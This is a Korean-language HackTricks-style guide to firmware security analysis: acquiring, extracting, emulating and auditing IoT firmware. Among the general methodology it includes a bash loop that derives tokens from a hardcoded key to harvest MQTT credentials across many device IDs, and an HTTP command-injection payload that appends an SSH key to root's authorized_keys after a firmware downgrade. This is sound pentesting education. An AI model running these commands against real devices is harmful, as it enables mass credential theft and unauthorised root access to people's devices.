# Firmware 분석

{{#include ../../banners/hacktricks-training.md}}

## **소개**

### 관련 자료


{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

Firmware는 하드웨어 구성 요소와 사용자가 상호작용하는 소프트웨어 간의 통신을 관리하고 원활하게 하여 장치가 올바르게 작동하도록 하는 필수 소프트웨어입니다. 이는 영구 메모리에 저장되어 전원이 켜지는 순간부터 장치가 중요한 명령에 접근할 수 있게 하며, 궁극적으로 운영 체제의 실행으로 이어집니다. Firmware를 조사하고 잠재적으로 수정하는 것은 보안 취약점을 식별하는 데 있어 중요한 단계입니다.

## **정보 수집**

**정보 수집**은 장치의 구성과 사용되는 기술을 이해하는 데 있어 중요한 초기 단계입니다. 이 과정은 다음과 같은 데이터를 수집하는 것을 포함합니다:

- CPU 아키텍처와 실행되는 운영 체제
- Bootloader 세부사항
- 하드웨어 레이아웃 및 데이터시트
- 코드베이스 메트릭과 소스 위치
- 외부 라이브러리와 라이선스 유형
- 업데이트 이력과 규제 인증
- 아키텍처 및 흐름도
- 보안 평가 및 식별된 취약점

이를 위해 **open-source intelligence (OSINT)** 도구가 매우 유용하며, 사용 가능한 오픈 소스 소프트웨어 구성요소에 대한 수동 및 자동화된 리뷰 과정도 중요합니다. [Coverity Scan](https://scan.coverity.com) 및 [Semmle’s LGTM](https://lgtm.com/#explore)와 같은 도구는 잠재적 문제를 찾는 데 활용할 수 있는 무료 정적 분석을 제공합니다.

## **Firmware 획득**

Firmware를 얻는 방법은 여러 가지가 있으며, 각 방법은 난이도가 다릅니다:

- **직접** 소스(개발자, 제조업체)로부터
- 제공된 지침으로 **빌드**하여
- 공식 지원 사이트에서 **다운로드**
- 호스팅된 firmware 파일을 찾기 위한 **Google dork** 쿼리 활용
- [S3Scanner](https://github.com/sa7mon/S3Scanner)와 같은 도구로 **cloud storage**에 직접 접근
- man-in-the-middle 기법을 통한 **updates** 가로채기
- **UART**, **JTAG**, 또는 **PICit** 같은 연결을 통해 장치에서 **추출**
- 장치 통신 내에서 업데이트 요청을 **스니핑**
- 하드코딩된 업데이트 엔드포인트 식별 및 사용
- bootloader 또는 네트워크에서 **덤프**
- 모든 방법이 실패할 경우 적절한 하드웨어 도구를 사용해 스토리지 칩을 **제거하고 읽기**

## Firmware 분석

이제 **firmware를 확보했으므로**, 이를 어떻게 다뤄야 할지 알기 위해 정보를 추출해야 합니다. 이를 위해 사용할 수 있는 다양한 도구들:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```
If you don't find much with those tools check the **entropy** of the image with `binwalk -E <bin>`, if low entropy, then it's not likely to be encrypted. If high entropy, Its likely encrypted (or compressed in some way).

Moreover, you can use these tools to extract **펌웨어에 포함된 파일들**:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Or [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/))로 파일을 검사할 수 있습니다.

### 파일 시스템 추출

With the previous commented tools like `binwalk -ev <bin>` you should have been able to **파일 시스템을 추출할 수 있었을 것입니다**.\
Binwalk usually extracts it inside a **파일 시스템 유형으로 이름이 지정된 폴더**, which usually is one of the following: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### 수동 파일 시스템 추출

Sometimes, binwalk will **서명에 파일 시스템의 매직 바이트가 없을 수 있습니다**. In these cases, use binwalk to **파일 시스템의 오프셋을 찾아 바이너리에서 압축된 파일 시스템을 carve(추출)**하고 **수동으로 추출**하여 아래 단계에 따라 해당 유형에 맞게 파일 시스템을 복원하십시오.
```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```
다음 **dd command**를 실행하여 Squashfs 파일시스템을 추출하세요.
```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```
또는 다음 명령을 실행할 수 있습니다.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- squashfs의 경우 (위 예제에서 사용됨)

`$ unsquashfs dir.squashfs`

파일은 이후 "`squashfs-root`" 디렉토리에 있게 됩니다.

- CPIO 아카이브 파일

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- jffs2 파일시스템의 경우

`$ jefferson rootfsfile.jffs2`

- NAND 플래시를 사용하는 ubifs 파일시스템의 경우

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## 펌웨어 분석

펌웨어를 확보한 후에는 구조와 잠재적 취약점을 이해하기 위해 그것을 분해하는 것이 중요합니다. 이 과정에서는 펌웨어 이미지에서 유용한 데이터를 분석하고 추출하기 위해 다양한 도구를 활용합니다.

### 초기 분석 도구

바이너리 파일(이하 `<bin>`)을 초기 검사하기 위한 명령들이 제공됩니다. 이 명령들은 파일 유형 식별, 문자열 추출, 이진 데이터 분석 및 파티션과 파일시스템 세부 정보 파악에 도움이 됩니다:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```
이미지의 암호화 상태를 평가하려면, **엔트로피**를 `binwalk -E <bin>`로 확인한다. 낮은 엔트로피는 암호화가 없음을 시사하며, 높은 엔트로피는 암호화 또는 압축 가능성을 나타낸다.

임베디드 파일을 추출하기 위해서는 **file-data-carving-recovery-tools** 문서와 파일 검사용 **binvis.io** 같은 도구 및 자료를 권장한다.

### 파일 시스템 추출

일반적으로 `binwalk -ev <bin>`을 사용하면 파일 시스템을 추출할 수 있으며, 보통 squashfs, ubifs 같은 파일시스템 유형 이름의 디렉터리에 추출된다. 그러나 **binwalk**가 magic bytes 누락으로 파일시스템 유형을 인식하지 못할 경우 수동 추출이 필요하다. 이 과정은 `binwalk`로 파일시스템의 오프셋을 찾고, 이어서 `dd` 명령으로 파일시스템을 추출하는 과정을 포함한다:
```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```
이후, 파일시스템 타입(예: squashfs, cpio, jffs2, ubifs)에 따라 콘텐츠를 수동으로 추출하기 위해 서로 다른 명령어를 사용합니다.

### 파일시스템 분석

파일시스템을 추출한 후에는 보안 결함을 찾는 작업이 시작됩니다. 불안전한 네트워크 데몬, 하드코딩된 자격증명, API 엔드포인트, 업데이트 서버 기능, 컴파일되지 않은 코드, 시작 스크립트 및 오프라인 분석을 위한 컴파일된 바이너리에 주의합니다.

**핵심 위치** 및 **검사 항목**에는 다음이 포함됩니다:

- **etc/shadow** 및 **etc/passwd**: 사용자 자격 증명
- **etc/ssl**의 SSL 인증서 및 키
- 잠재적 취약점이 있는 설정 및 스크립트 파일
- 추가 분석을 위한 임베디드 바이너리
- 일반적인 IoT 디바이스 웹 서버 및 바이너리

다음 도구들은 파일시스템 내 민감한 정보와 취약점을 발견하는 데 도움이 됩니다:

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) 및 [**Firmwalker**](https://github.com/craigz28/firmwalker): 민감한 정보 검색용
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core): 종합적인 펌웨어 분석용
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go), 및 [**EMBA**](https://github.com/e-m-b-a/emba): 정적 및 동적 분석용

### 컴파일된 바이너리 보안 검사

파일시스템에서 발견된 소스 코드와 컴파일된 바이너리는 모두 취약점에 대해 면밀히 검토해야 합니다. Unix 바이너리용 **checksec.sh**, Windows 바이너리용 **PESecurity**와 같은 도구는 악용될 수 있는 보호되지 않은 바이너리를 식별하는 데 도움이 됩니다.

## 파생된 URL 토큰을 통한 클라우드 구성 및 MQTT 자격증명 수집

많은 IoT 허브는 다음과 같은 클라우드 엔드포인트에서 디바이스별 구성을 가져옵니다:

- `https://<api-host>/pf/<deviceId>/<token>`

펌웨어 분석 중 `<token>`이 하드코딩된 비밀을 사용해 디바이스 ID로부터 장치 내에서 파생된 것을 발견할 수 있습니다. 예를 들어:

- token = MD5( deviceId || STATIC_KEY ) and represented as uppercase hex

이 설계는 deviceId와 STATIC_KEY를 알게 된 누구나 URL을 재구성하여 클라우드 구성을 가져올 수 있게 하며, 종종 평문 MQTT 자격증명과 토픽 접두사가 노출됩니다.

실전 워크플로:

1) UART 부팅 로그에서 deviceId 추출

- 3.3V UART 어댑터(TX/RX/GND)를 연결하고 로그를 캡처합니다:
```bash
picocom -b 115200 /dev/ttyUSB0
```
- cloud config URL 패턴과 브로커 주소를 출력하는 라인을 찾으세요. 예:
```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```
2) 펌웨어에서 STATIC_KEY와 token 알고리즘 복구

- 바이너리를 Ghidra/radare2에 로드하고 구성 경로 ("/pf/") 또는 MD5 사용을 검색합니다.
- 알고리즘을 확인합니다 (예: MD5(deviceId||STATIC_KEY)).
- Bash에서 token을 도출하고 digest를 대문자로 변환:
```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```
3) 클라우드 구성 및 MQTT 자격 증명 수집

- URL을 구성하고 curl로 JSON을 가져온 뒤 jq로 파싱하여 시크릿을 추출합니다:
```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```
4) 평문 MQTT 및 약한 topic ACLs 악용 (있는 경우)

- 복구된 자격증명을 사용해 maintenance topics를 구독하고 민감한 이벤트를 찾아보세요:
```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
-i <client_id> -u <username> -P <password> \
-t "<topic_prefix>/<deviceId>/admin" -v
```
5) 예측 가능한 장치 ID 열거(대규모로, 권한을 가진 상태에서)

- 많은 생태계는 vendor OUI/product/type 바이트를 포함하고 그 뒤에 순차적 접미사가 붙습니다.
- 후보 ID를 반복(iterate)하면서 토큰을 파생(derive)하고 구성(configs)을 프로그래밍 방식으로 가져올 수 있습니다:
```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
DEVICE_ID="${PREFIX}${SUF}"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```
참고
- mass enumeration을 시도하기 전에 항상 명시적 허가를 받으세요.
- 가능한 경우 대상 하드웨어를 변경하지 않고 secrets를 복구하기 위해 emulation 또는 static analysis를 우선 사용하세요.

펌웨어를 에뮬레이션하는 과정은 기기 동작 또는 개별 프로그램에 대한 **dynamic analysis**를 가능하게 합니다. 이 접근법은 하드웨어나 아키텍처 의존성에서 문제가 발생할 수 있지만, 루트 파일시스템(root filesystem)이나 특정 바이너리를 Raspberry Pi와 같이 아키텍처 및 endianness가 일치하는 장치로 옮기거나, 미리 만들어진 가상 머신으로 옮기면 추가 테스트가 쉬워집니다.

### 개별 바이너리 에뮬레이션

단일 프로그램을 검사할 때는 프로그램의 endianness와 CPU 아키텍처를 식별하는 것이 중요합니다.

#### MIPS 아키텍처 예시

MIPS 아키텍처 바이너리를 에뮬레이션하려면 다음 명령을 사용할 수 있습니다:
```bash
file ./squashfs-root/bin/busybox
```
필요한 에뮬레이션 도구를 설치하려면:
```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```
For MIPS (big-endian), `qemu-mips` is 사용되며, little-endian 바이너리의 경우 `qemu-mipsel`을 선택합니다.

#### ARM Architecture Emulation

ARM 바이너리의 경우 프로세스는 유사하며, 에뮬레이션에는 `qemu-arm` 에뮬레이터가 사용됩니다.

### Full System Emulation

Tools like [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit), and others는 전체 펌웨어 에뮬레이션을 용이하게 하며, 프로세스를 자동화하고 동적 분석을 돕습니다.

## Dynamic Analysis in Practice

이 단계에서는 실제 장치 환경 또는 에뮬레이션된 환경을 사용하여 분석합니다. OS와 파일시스템에 대한 shell 접근을 유지하는 것이 필수적입니다. 에뮬레이션은 하드웨어 상호작용을 완벽히 모사하지 못할 수 있으므로 가끔 에뮬레이션을 재시작해야 할 수 있습니다. 분석은 파일시스템을 재검토하고, 노출된 웹페이지와 네트워크 서비스를 악용하며, 부트로더 취약점을 탐색해야 합니다. 펌웨어 무결성 검사도 중요한데, 이는 잠재적인 백도어 취약점을 식별하는 데 필요합니다.

## Runtime Analysis Techniques

런타임 분석은 gdb-multiarch, Frida, Ghidra 같은 도구를 사용하여 프로세스나 바이너리와 운영 환경에서 상호작용하고, 브레이크포인트를 설정하며 퍼징 등 기법을 통해 취약점을 식별하는 작업을 포함합니다.

## Binary Exploitation and Proof-of-Concept

식별된 취약점에 대한 PoC를 개발하려면 대상 아키텍처에 대한 깊은 이해와 저수준 언어로의 프로그래밍이 필요합니다. 임베디드 시스템에서는 바이너리 런타임 보호가 드물지만, 존재할 경우 Return Oriented Programming (ROP)과 같은 기법이 필요할 수 있습니다.

## Prepared Operating Systems for Firmware Analysis

운영체제 예시로는 [AttifyOS](https://github.com/adi0x90/attifyos)와 [EmbedOS](https://github.com/scriptingxss/EmbedOS)가 있으며, 펌웨어 보안 테스트에 필요한 도구들이 사전 구성된 환경을 제공합니다.

## Prepared OSs to analyze Firmware

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS는 Internet of Things (IoT) 장치의 보안 평가와 펜테스팅을 돕기 위한 배포판입니다. 필요한 도구들이 미리 로드된 사전 구성된 환경을 제공하여 많은 시간을 절약해 줍니다.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): Ubuntu 18.04 기반의 임베디드 보안 테스트 운영체제로, 펌웨어 보안 테스트 도구들이 선탑재되어 있습니다.

## Firmware Downgrade Attacks & Insecure Update Mechanisms

벤더가 펌웨어 이미지에 대해 암호화 서명 검사를 구현하더라도, **version rollback (downgrade) protection is frequently omitted**. 부트로더나 복구로더가 내장된 공개키로 서명만 검증하고 플래시될 이미지의 *버전*(또는 단조 카운터)을 비교하지 않는 경우, 공격자는 합법적으로 **여전히 유효한 서명을 가진 오래된 취약한 펌웨어를 설치**하여 패치된 취약점을 다시 도입할 수 있습니다.

일반적인 공격 워크플로우:

1. **Obtain an older signed image**
* 벤더의 공개 다운로드 포털, CDN 또는 지원 사이트에서 가져옵니다.
* companion mobile/desktop applications에서 추출합니다(예: Android APK 내부의 `assets/firmware/`).
* VirusTotal, 인터넷 아카이브, 포럼 등 제3자 저장소에서 검색합니다.
2. **Upload or serve the image to the device** via any exposed update channel:
* Web UI, mobile-app API, USB, TFTP, MQTT 등.
* 많은 소비자용 IoT 장치는 Base64로 인코딩된 펌웨어 블롭을 받아 서버 측에서 디코드하고 복구/업그레이드를 트리거하는 *인증되지 않은* HTTP(S) 엔드포인트를 노출합니다.
3. 다운그레이드 후, 최신 릴리스에서 패치된 취약점(예: 이후에 추가된 command-injection 필터)을 악용합니다.
4. 선택적으로 영구성을 확보한 뒤 탐지를 피하기 위해 최신 이미지를 다시 플래시하거나 업데이트를 비활성화합니다.

### Example: Command Injection After Downgrade
```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```
취약한(다운그레이드된) 펌웨어에서는 `md5` 파라미터가 입력 검증 없이 쉘 명령에 직접 연결되어 임의의 명령을 주입할 수 있다(예: SSH 키 기반 root 접근 활성화). 이후 펌웨어 버전에서는 기본 문자 필터가 도입되었지만, 다운그레이드 보호가 없으면 해당 수정은 무용지물이다.

### 모바일 앱에서 펌웨어 추출하기

많은 제조업체는 동반 모바일 앱에 전체 펌웨어 이미지를 번들로 포함하여 앱이 Bluetooth/Wi-Fi를 통해 기기를 업데이트할 수 있게 한다. 이러한 패키지는 일반적으로 APK/APEX의 `assets/fw/` 또는 `res/raw/` 같은 경로에 암호화되지 않은 상태로 저장된다. `apktool`, `ghidra`, 또는 단순한 `unzip`과 같은 도구를 사용하면 물리적 하드웨어에 접근하지 않고도 서명된 이미지를 추출할 수 있다.
```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```
### 업데이트 로직 평가 체크리스트

* 업데이트 엔드포인트의 전송/인증(transport/authentication)은 적절히 보호되어 있나 (TLS + authentication)?
* 디바이스는 플래싱 전 **버전 번호** 또는 **단조(monotonic) anti-rollback 카운터**를 비교하나?
* 이미지는 secure boot chain 내부에서 검증되는가(예: ROM 코드에서 서명 확인)?
* userland 코드가 추가적인 정합성 검사를 수행하는가(예: 허용된 파티션 맵, 모델 번호)?
* *partial* 또는 *backup* 업데이트 흐름이 동일한 검증 로직을 재사용하나?

> 💡  위 항목 중 하나라도 누락되었다면 플랫폼은 아마 롤백(rollback) 공격에 취약할 것입니다.

## 연습용 취약 펌웨어

펌웨어 취약점 발견 연습을 위해 다음 취약 펌웨어 프로젝트들을 시작점으로 사용하세요.

- OWASP IoTGoat
- [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
- [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
- [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
- [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
- [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
- [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## 참고자료

- [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [Exploiting zero days in abandoned hardware – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)


- [How a $20 Smart Device Gave Me Access to Your Home](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)

## 교육 및 인증

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

{{#include ../../banners/hacktricks-training.md}}
